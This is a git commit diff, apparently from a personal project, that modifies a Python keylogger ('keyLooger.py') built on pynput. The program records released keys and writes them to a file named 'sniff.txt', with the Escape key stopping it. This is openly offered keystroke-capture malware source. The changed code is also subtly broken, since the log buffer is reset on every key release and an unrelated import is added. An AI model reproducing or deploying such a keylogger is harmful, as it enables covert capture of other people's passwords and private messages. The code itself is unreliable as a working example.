670d1015d62e75246975b9b31c95d5a29e0fa352
Jamaika <benarfi.2001@gmail.com>
2022-05-20 23:19:00 +0100

    Modifing KeyLogger To Store in one string

--- keyLooger.py
+++ keyLooger.py
@@ -1,20 +1,20 @@
-from pynput import keyboard 
+from pkg_resources import working_set
 from pynput.keyboard import Listener , Key
 f = open('sniff.txt','a')
-
+log = ""
 def on_press(key):
     print("{0} pressed".format(key))
-    
-log = []
+
 def on_release(key):
-    
-    log.append(key)
-    print(log)
-    f.write(str(log))
-    if key == Key.esc:
+    log=''
+    if key == Key.enter:
+        f.writelines(log+'\n')
+        log=''
+    elif key == Key.esc:
         f.close() 
         quit()
+    else:
+        log+= str(key) + ' '
 
 with Listener(on_press=on_press , on_release=on_release) as listener:
-    
     listener.join()
